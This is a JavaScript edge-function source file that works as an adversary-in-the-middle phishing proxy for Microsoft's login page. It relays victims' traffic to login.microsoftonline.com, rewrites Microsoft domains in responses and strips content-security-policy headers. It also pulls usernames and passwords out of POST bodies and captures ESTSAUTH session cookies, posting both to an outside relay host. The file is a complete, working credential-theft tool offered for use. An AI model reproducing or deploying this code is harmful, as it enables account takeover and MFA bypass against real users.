export const runtime = 'edge';

// ==================== CONFIG ====================
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
// ===============================================

async function sendCredsToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (e) {}
}

async function exfiltrateCookiesFile(cookieText, ip) {
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

async function handleProxy(request, pathSegments = []) {
  const url = new URL(request.url);
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  const url_hostname = url.hostname;
  const upstream_domain = UPSTREAM;

  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.hostname = upstream_domain;
  upstreamUrl.port = '';

  if (upstreamUrl.pathname === '/' || upstreamUrl.pathname === '') {
    upstreamUrl.pathname = UPSTREAM_PATH;
  } else {
    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
  }

  console.log('Proxying to:', upstreamUrl.toString());

  const method = request.method;
  const new_request_headers = new Headers(request.headers);
  new_request_headers.delete('Host');
  new_request_headers.set('Referer', `https://${upstream_domain}`);

  // Credential harvesting
  if (method === 'POST') {
    try {
      const temp_req = request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split('&');
      let user, pass;

      for (const pair of keyValuePairs) {
        const [key, value] = pair.split('=');
        if (key === 'login' && value) user = decodeURIComponent(value.replace(/\+/g, ' '));
        if (key === 'passwd' && value) pass = decodeURIComponent(value.replace(/\+/g, ' '));
      }

      if (user && pass) {
        await sendCredsToVercel({ type: "creds", ip: ipAddress, user, pass });
      }
    } catch (error) {
      console.error('Credential parsing error:', error.message);
    }
  }

  // Main fetch
  try {
    const fetchOptions = { method, headers: new_request_headers };
    if (!["GET", "HEAD"].includes(method)) {
      fetchOptions.body = request.body;
      fetchOptions.duplex = 'half';
    }

    let original_response = await fetch(upstreamUrl.toString(), fetchOptions);

    const connection_upgrade = new_request_headers.get("Upgrade");
    if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
      return original_response;
    }

    const original_response_clone = original_response.clone();
    const new_response_headers = new Headers(original_response.headers);
    const status = original_response.status;

    new_response_headers.set('access-control-allow-origin', '*');
    new_response_headers.set('access-control-allow-credentials', 'true');
    new_response_headers.delete('content-security-policy');
    new_response_headers.delete('content-security-policy-report-only');
    new_response_headers.delete('clear-site-data');

    
    let all_cookies = "";
    try {
      const originalCookies = (typeof new_response_headers.getAll === "function")
        ? new_response_headers.getAll("Set-Cookie")
        : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);

      all_cookies = originalCookies.join("; \n\n");

      originalCookies.forEach(originalCookie => {
        const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });
    } catch (error) {
      console.error('Cookie processing error:', error);
    }

    if (
      (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) ||
      all_cookies.includes('ESTSAUTHLIGHT')
    ) {
      await exfiltrateCookiesFile(all_cookies, ipAddress);
    }

    
    const content_type = new_response_headers.get('content-type');
    let original_text;

    if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
      let text = await original_response_clone.text();

      // 1. Domain replacements
      text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
      text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
      text = text.replace(/login\.microsoftonline\.com/g, url_hostname);

      text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
      text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
      text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
      text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);

      // 2. CRITICAL FIX: Handle root-relative paths for specific endpoints BEFORE broader patterns
      // These are often referenced without quotes in JS: fetch("/Me.htm") or fetch('/Prefetch.aspx')
      text = text.replace(/(["'])\/(Me\.htm|Prefetch\.aspx)\b/g, `$1https://${url_hostname}/$2`);
      
      // 3. Handle paths with /common/ prefix
      text = text.replace(/(["'])\/common\/(Me\.htm|Prefetch\.aspx)\b/g, `$1https://${url_hostname}/common/$2`);
      
      // 4. Handle any remaining root-relative API paths
      text = text.replace(/(["'])\/(common|shared|ests)\/([^"'\s]*)/g, `$1https://${url_hostname}/$2/$3`);
      
      // 5. Handle specific API endpoints that might be constructed dynamically
      text = text.replace(/(["'])\/(api|sso|ajax|graphql)\/([^"'\s]*)/g, `$1https://${url_hostname}/$3`);

      // 6. VERY BROAD SAFETY NET: Catch any remaining absolute paths starting with /
      // that look like API endpoints (contain .aspx, .htm, or common path segments)
      // But be careful not to break legitimate relative paths
      text = text.replace(/(["'])\/([^"'\s]*\.(?:aspx|htm|html|ashx|asmx))\b/gi, `$1https://${url_hostname}/$2`);
      
      // 7. Handle URL construction patterns like: var base = "https://login.microsoftonline.com"; fetch(base + "/Me.htm")
      text = text.replace(/(https:\/\/[^"'\s]+)\s*\+\s*["']\/(Me\.htm|Prefetch\.aspx)\b/g, `https://${url_hostname}/$2`);

      // 8. Force any remaining localhost to your domain (last resort safety)
      text = text.replace(/https?:\/\/localhost(:\d+)?/g, `https://${url_hostname}`);

      // 9. Handle cases where protocol-relative URLs might be used
      text = text.replace(/(["'])\/\/(Me\.htm|Prefetch\.aspx)\b/g, `$1https://${url_hostname}/$2`);

      original_text = text;
    } else {
      original_text = original_response_clone.body;
    }

    return new Response(original_text, {
      status,
      headers: new_response_headers
    });

  } catch (fetchError) {
    console.error('Upstream fetch failed:', {
      url: upstreamUrl.toString(),
      method,
      error: fetchError.message,
      cause: fetchError.cause || null
    });

    return new Response(
      JSON.stringify({ error: "Proxy Error", message: "Failed to reach upstream" }),
      { status: 502, headers: { 'content-type': 'application/json' } }
    );
  }
}

// Handlers
export const GET = handleProxy;
export const POST = handleProxy;
export const PUT = handleProxy;
export const DELETE = handleProxy;
export const PATCH = handleProxy;
export const OPTIONS = handleProxy;
export const HEAD = handleProxy;
